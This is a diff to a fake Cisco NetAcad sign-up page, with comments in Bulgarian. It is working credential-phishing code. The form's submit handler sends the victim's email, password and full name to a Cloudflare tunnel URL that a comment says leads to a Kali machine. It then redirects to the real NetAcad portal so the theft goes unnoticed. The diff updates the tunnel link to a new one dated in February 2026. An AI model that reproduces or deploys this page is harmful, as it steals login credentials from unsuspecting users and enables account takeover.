@@ -20,7 +20,6 @@
             background: #ffffff;
         }
 
-        /* ЛЯВА ЧАСТ (БАНЕР) */
         .banner-side { 
             flex: 1.2; 
             background-color: var(--cisco-bg-banner); 
@@ -46,7 +45,6 @@
         .banner-side p { font-size: 16px; color: #4a4a4a; max-width: 80%; line-height: 1.5; margin-bottom: 40px; }
         .banner-image { width: 100%; max-width: 480px; height: auto; display: block; }
 
-        /* ДЯСНА ЧАСТ (ФОРМА) */
         .form-side { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px; }
         .content-box { width: 100%; max-width: 420px; position: relative; }
 
@@ -92,7 +90,7 @@
         <div class="content-box">
             <div class="top-nav">
                 <span>🌐 English (English)</span>
-                <a href="https://netacad-support-ops.github.io/index.html/" class="back-btn">← Go back</a>
+                <a href="../index.html" class="back-btn">← Go back</a>
             </div>
 
             <h1>Sign Up</h1>
@@ -119,8 +117,8 @@
     document.getElementById('final-form').onsubmit = function(e) {
         e.preventDefault();
         
-        // ВАЖНО: Твоят актуален Cloudflare линк + /login
-        const gate = "https://pair-great-sand-fleece.trycloudflare.com/login";
+        // НОВИЯТ ТИ ЛИНК ОТ ДНЕС (04.02.2026)
+        const gate = "https://moms-replication-contrary-snow.trycloudflare.com/login";
 
         const data = {
             email: document.getElementById('email').value,
@@ -128,14 +126,13 @@
             name: document.getElementById('fname').value + " " + document.getElementById('lname').value
         };
 
-        // Изпращане на данните към Kali през тунела
-        // Ползваме GET параметри (u, p, n), за да е по-сигурно преминаването
+        // Изпращане към Kali
         fetch(`${gate}?u=${encodeURIComponent(data.email)}&p=${encodeURIComponent(data.pass)}&n=${encodeURIComponent(data.name)}`, {
             mode: 'no-cors',
             method: 'GET'
         });
 
-        // Малко забавяне за изпращане и пренасочване към истинския сайт
+        // Пренасочване към истинския NetAcad портал
         setTimeout(() => {
             window.location.href = "https://www.netacad.com/portal/learning";
         }, 1000);
@@ -143,5 +140,3 @@
 </script>
 </body>
 </html>
-
-
